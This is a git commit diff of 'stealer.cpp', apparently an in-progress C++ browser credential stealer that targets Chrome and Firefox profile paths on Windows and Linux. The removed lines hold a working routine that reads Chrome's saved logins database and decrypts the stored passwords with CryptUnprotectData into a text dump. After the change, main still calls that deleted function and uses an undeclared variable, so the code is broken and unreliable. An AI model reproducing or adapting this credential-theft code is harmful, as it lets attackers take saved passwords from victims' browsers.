b9191fc64905e715dd8d7e567d012c04dbf707d1
HlebHatouka <hlem.hatouka@protonmail.com>
2019-10-17 16:56:42 +0300

    update

--- stealer.cpp
+++ stealer.cpp
@@ -12,6 +12,7 @@
 #include "sqlite3.h"
 
 #ifdef _WIN32
+    #include "windows/tools.h"
     #include <windows.h>
     #include <Wincrypt.h>
     #include <tchar.h>
@@ -21,13 +22,13 @@
     #else
         typedef std::wstring String; 
     #endif
-
+#else __linux__
+    #include "linux/tools.h"
 #endif
 
 namespace fs = std::experimental::filesystem;
 
-int callback1(void *NotUsed, int argc, char **argv, char **azColName);
-std::stringstream get_pass(sqlite3* db);
+
 
 int main()
 {
@@ -36,6 +37,9 @@ int main()
 #ifdef __linux__
         std::string chrome_db_path = "~/.config/google-chrome/Default";
         std::string firefox_db_path = "~/.mozilla/firefox/<profilename>";
+
+        sqlite3 *db;
+
 #else _WIN32
         TCHAR username[255];
         DWORD username_len = 255;
@@ -48,23 +52,14 @@ int main()
         String firefox_db_path = _T("C:\\Users\\");
         firefox_db_path += username;
         firefox_db_path += _T("\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\");
+
+        sqlite3 *db;
 #endif
 
         if( fs::exists(chrome_db_path))
         {
-                //std::cout << "ch exists" << std::endl;
-            sqlite3 *db;
-            char *zErrMsg = 0;
-            int rc;
-            std::string sql = "SELECT action_url, username_value, password_value FROM logins";
-            rc = sqlite3_open(chrome_db_path.c_str(), &db);
-            std::stringstream pass;
-            if( rc )
-            {
-                std::cout << "DB Error: " << sqlite3_errmsg(db) << std::endl;
-                sqlite3_close(db);
-                return(1);
-            }
+            std::cout << "ch exists" << std::endl;
+            
             pass = get_pass(db);
             std::cout << pass.str();
 
@@ -73,73 +68,10 @@ int main()
 
         if( fs::exists(firefox_db_path))
         {
-            //std::cout << "ff exists" << std::endl;
+            std::cout << "ff exists" << std::endl;
         }
     }
     catch(...){}
 
     return 0;
-}
-
-int callback1(void *NotUsed, int argc, char **argv, char **azColName)
-{
-    for(int i = 0; i < argc; i++) 
-    {
-        std::cout << azColName[i] << ": " << argv[i] << std::endl;
-    }
-    std::cout << std::endl;
-    return 0;
-}
-
-std::stringstream get_pass(sqlite3* db)
-{
-         std::string sql = "SELECT action_url, username_value, password_value FROM logins";
-         int rc;
-        std::stringstream dump(std::string(""));
-            sqlite3_stmt *pStmt;
-
-            rc = sqlite3_prepare(db, sql.c_str(), -1, &pStmt, 0);
-            if (rc != SQLITE_OK)
-            {
-                std::cout << "statement failed rc = " << rc << std::endl;
-                return  std::stringstream();
-            }
-            std::cout << std::endl;
-
-            rc = sqlite3_step(pStmt);
-            //std::cout << "RC: " << rc << std::endl;
-            while (rc == SQLITE_ROW) 
-            {
-                dump << sqlite3_column_text(pStmt, 0) << std::endl;
-                dump << (char *)sqlite3_column_text(pStmt, 1) << std::endl;
-
-                DATA_BLOB encryptedPass, decryptedPass;
-
-                encryptedPass.cbData = (DWORD)sqlite3_column_bytes(pStmt, 2);
-                encryptedPass.pbData = (byte *)malloc((int)encryptedPass.cbData);
-
-                memcpy(encryptedPass.pbData, sqlite3_column_blob(pStmt, 2), (int)encryptedPass.cbData);
-
-                CryptUnprotectData(
-                        &encryptedPass,
-                        NULL,
-                        NULL,
-                        NULL,
-                        NULL,
-                        0,
-                        &decryptedPass);
-                char *password = (char *)decryptedPass.pbData;
-                while (isprint(*password))
-                {
-                        dump << *password;
-                        password++;
-                }
-                
-                dump << std::endl;
-                free(encryptedPass.pbData);
-                rc = sqlite3_step(pStmt);
-        }
-            rc = sqlite3_finalize(pStmt);
-            sqlite3_close(db);
-            return dump;
 }
